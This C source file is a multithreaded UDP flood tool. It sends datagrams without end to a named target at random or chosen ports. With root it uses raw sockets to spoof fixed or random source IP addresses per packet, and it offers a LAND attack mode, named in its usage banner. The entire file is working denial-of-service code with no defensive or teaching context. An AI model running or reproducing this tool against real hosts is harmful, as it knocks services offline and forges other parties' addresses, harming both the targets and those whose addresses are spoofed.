// printf, perror
#include <stdio.h>
// exit, atoi, srand, rand
#include <stdlib.h>
// memset, memcpy, strncpy
#include <string.h>
// getopt, optind, optarg
#include <unistd.h>
// time
#include <time.h>
// pthread_t, pthread_create, pthread_join
#include <pthread.h>
// gethostbyname, herror
#include <netdb.h>
// inet_addr
#include <arpa/inet.h>
// uint8_t, uint16_t, uint32_t
#include <sys/types.h>
// socket, sendto, SOCK_RAW, SOCK_DGRAM
#include <sys/socket.h>
// sockaddr, sockaddr_in, IPPROTO_UDP
#include <netinet/in.h>
// udphdr
#include <netinet/udp.h>

#define PEER_LEN sizeof(struct sockaddr_in)

typedef struct option_t
{
  int size;
  char source[16];
  int8_t ssource, rsource, rdport, one, land;
} option_t;

struct thread_args
{
  struct sockaddr_in *peer;
  option_t *option;
};

struct pseudo_udphdr
{
  in_addr_t up_src;
  in_addr_t up_dst;
  uint8_t up_zero;
  uint8_t up_p;
  uint16_t up_len;
};

void banner(const char *name)
{
  printf("Usage: %s [-1pztrsl] <target>\n\n"
         "flags:\n"
         "\t-1\t\t:: send one dgram and exit\n"
         "\t-p <port>\t:: destination port (by default random for each dgram)\n"
         "\t-z <size>\t:: dgram data length (default 10)\n"
         "\t-i <threads>\t:: amount of threads to be spun up\n\n"
         "only root:\n"
         "\t-r\t\t:: random source IP for each dgram\n"
         "\t-s <source>\t:: set source IP\n"
         "\t-l\t\t:: land attack\n\n",
         name);
  exit(1);
}

void init_option(option_t *option)
{
  memset(option, 0, sizeof(option_t));
  option->size = 25;
  option->rdport = 1;
}

uint16_t checksum(uint16_t *p, int n)
{
  uint16_t *c = p;
  uint32_t sum = 0;

  while (n > 1)
  {
    sum += *c++;
    n -= 2;
  }
  if (n)
  {
    sum += *(uint8_t *)c;
  }
  while (sum >> 16)
  {
    sum = (sum >> 16) + (sum & 0xffff);
  }

  return (uint16_t)(~sum);
}

void *sendto_nonroot(void *args)
{
  struct sockaddr_in *peer = ((struct thread_args *)args)->peer;
  option_t *option = ((struct thread_args *)args)->option;
  static char packet[128];
  int sock;

  if ((sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
  {
    perror("socket()");
    return NULL;
  }
  memset(packet, 'x', option->size);
  do
  {
    if (option->rdport)
    {
      peer->sin_port = htons(rand() & 65535);
    }
    sendto(sock, packet, option->size, 0, (struct sockaddr *)peer, PEER_LEN);
  } while (!option->one);

  return NULL;
}

void *sendto_root(void *args)
{
  struct sockaddr_in *peer = ((struct thread_args *)args)->peer;
  option_t *option = ((struct thread_args *)args)->option;
  static char packet[128];
  struct pseudo_udphdr phdr;
  struct udphdr uhdr;
  int sock, pkt_len, phdr_len, uhdr_len;

  if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
  {
    perror("socket()");
    return NULL;
  }
  phdr_len = sizeof(phdr);
  uhdr_len = sizeof(uhdr);
  pkt_len = uhdr_len + option->size;

  phdr.up_dst = peer->sin_addr.s_addr;
  phdr.up_len = htons(pkt_len);
  phdr.up_zero = 0;
  phdr.up_p = IPPROTO_UDP;
  uhdr.uh_sport = htons(rand() & 65535);
  uhdr.uh_ulen = htons(pkt_len);

  if (option->ssource)
  {
    phdr.up_src = inet_addr(option->source);
  }
  if (option->land)
  {
    phdr.up_dst = phdr.up_src;
    uhdr.uh_dport = uhdr.uh_sport;
  }
  memset(&packet[phdr_len + uhdr_len], 'x', option->size);
  do
  {
    uhdr.uh_sum = 0;
    if (option->rsource)
    {
      phdr.up_src = rand();
    }
    if (option->rdport)
    {
      uhdr.uh_dport = htons(rand() & 65535);
      if (option->land)
      {
        uhdr.uh_sport = uhdr.uh_dport;
      }
    }
    memcpy(packet, &phdr, phdr_len);
    memcpy(&packet[phdr_len], &uhdr, uhdr_len);
    uhdr.uh_sum = checksum((uint16_t *)packet, phdr_len + pkt_len);
    memcpy(&packet[phdr_len], &uhdr, uhdr_len);
    sendto(sock, &packet[phdr_len], pkt_len, 0, (struct sockaddr *)peer, PEER_LEN);
  } while (!option->one);

  return NULL;
}

int main(int argc, char *argv[])
{
  option_t option;
  struct thread_args args;
  struct sockaddr_in peer;
  struct hostent *dns = NULL;
  int arg, dport, nthreads = 1;

  srand(time(NULL));
  init_option(&option);

  while ((arg = getopt(argc, argv, "1p:z:rs:li:")) > -1)
  {
    switch (arg)
    {
    case '1':
      option.one = 1;
      break;
    case 'p':
      dport = atoi(optarg);
      option.rdport = 0;
      break;
    case 'z':
      if ((option.size = atoi(optarg)) > 100)
      {
        printf("Datagram data too long (max 100 bytes)\n");
        return 1;
      }
      break;
    case 'r':
      option.rsource = 1;
      option.ssource = 0;
      option.land = 0;
      break;
    case 's':
      strncpy(option.source, optarg, sizeof(option.source));
      option.ssource = 1;
      option.rsource = 0;
      option.land = 0;
      break;
    case 'l':
      option.land = 1;
      option.ssource = 0;
      option.rsource = 0;
      break;
    case 'i':
      nthreads = atoi(optarg);
      break;
    case '?':
    default:
      exit(1);
    }
  }
  if (argc - optind < 1 || argc - optind > 1)
  {
    banner(argv[0]);
  }
  else if ((dns = gethostbyname(argv[optind])) == NULL)
  {
    herror(argv[optind]);
    return 1;
  }

  peer.sin_family = dns->h_addrtype;
  memcpy(&peer.sin_addr, *dns->h_addr_list, dns->h_length);
  if (!option.rdport)
  {
    peer.sin_port = htons(dport);
  }
  args.peer = &peer;
  args.option = &option;

  if (option.rsource || option.ssource || option.land)
  {
    pthread_t threads[nthreads];
    do
    {
      printf("Started thread: %d\n", nthreads);
      pthread_create(&threads[nthreads - 1], NULL, sendto_root, &args);
      nthreads--;
    } while (nthreads > 0);
    pthread_join(threads[0], NULL);
  }
  else
  {
    sendto_nonroot(&args);
  }
  printf("Finished\n");

  return 0;
}
